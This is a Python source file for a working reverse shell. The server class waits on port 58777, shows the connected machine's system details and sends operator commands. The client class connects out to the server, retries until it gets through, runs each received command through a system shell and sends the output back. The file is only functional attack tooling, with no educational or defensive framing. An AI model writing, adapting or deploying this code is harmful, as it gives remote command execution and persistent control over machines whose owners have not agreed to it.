import os, sys, socket, json
import subprocess, time, platform
from terminaltables import AsciiTable
from Logger import *

class Server:    

    def __init__(self, host = '0.0.0.0', port = 58777, attempts = 10):
        self.host = host
        self.port = port
        self.attempts = attempts
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn = None
        self.addr = None
        self.client = None
        self.log = Logger('server')

    def listen(self, attempt = 1):
        try:
            self.log.info(f'Listening on Port {self.port} (Attempt {attempt})')
            self.s.bind((self.host, self.port))
            self.s.listen(1)
        except socket.error as error:
            self.log.error(f'Socket Binding Error: {error}')
            if attempt < self.attempts: 
                self.log.info('Retrying...', ['console'])
                self.listen(attempt + 1)

    def accept(self):
        try:
            self.conn, self.addr = self.s.accept()
            self.log.info(f'Session Opened at {self.addr[0]}:{self.addr[1]}')
            self.client = json.loads(self.conn.recv(16834).decode())
            self.client['table'] = AsciiTable([[key.title(), val] for key, val in self.client.items()])

            self.client['table'].inner_heading_row_border = False
            print('\nClient Machine Information:\n' + self.client['table'].table)

            self.help()
            self.prompt()
            self.log.warn(f'Session Closed at {self.addr[0]}:{self.addr[1]}')
        except socket.error as error:
            self.log.error(f'Socket Binding Error: {error}')         

    def prompt(self):
        while True:
            cmd = input('\n' + str(self.addr[0]) + '@' + str(self.client['node']) + '>> ')
            if cmd == ':help':
                self.help()
            elif cmd == ':info':
                print('\nClient Machine Information:\n' + self.client['table'].table)
            else:
                command = self.conn.send(cmd.encode())
                self.log.info(f'Command Sent: {cmd}', ['file'])

                if cmd in [':kill', ':exit']:
                    return
                else:
                    result = self.conn.recv(16834).decode()
                    print('\n' + result)

    def help(self):
        commands = {
            'exit': 'Terminate current connection, keep client script running',
            'kill': 'Terminate current connection and client script',
            'info': 'Show client machine information',
            'help': 'Show help screen',
        }
        print('\nReverse Shell Commands:')
        for cmd, desc in commands.items():
            print(f'   :{cmd} => {desc}')

class Client:

    def __init__(self, host, port = 58777):        
        self.host = host
        self.port = int(port)
        self.log = Logger('client', stream = ['console'])
        self.log.info(f'Waiting for Server')

    def connect(self):
        try:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.connect((self.host, self.port))
            self.log.info('Connection Established')
            self.s.send(json.dumps(platform.uname()._asdict()).encode())
        except Exception as error:
            time.sleep(2)
            self.connect()

    def reconnect(self):
        self.stop()
        time.sleep(2)
        self.log.info('Waiting for Server')
        self.connect()
        self.receive()

    def receive(self):
        try:
            command = self.s.recv(1024).decode()
            if command == ':exit':                
                self.reconnect()
            elif command == ':kill':
                return
            else:
                shell = subprocess.Popen(command, shell = True, stdout= subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
                output = shell.stdout.read() + shell.stderr.read()
                if len(output) == 0:
                    output = b'[!] Command Returned Empty Response'
                self.send(output)
        except socket.error as error:
            self.log.error(f'Socket Receive Error: {error}')
            self.reconnect()

    def send(self, output):
        try:
            self.s.send(output)
            self.receive()
        except socket.error as error:
            self.log.error(f'Socket Send Error: {error}')
            self.reconnect()

    def stop(self):
        self.log.warn('Terminating Connection\n')
        self.s.close()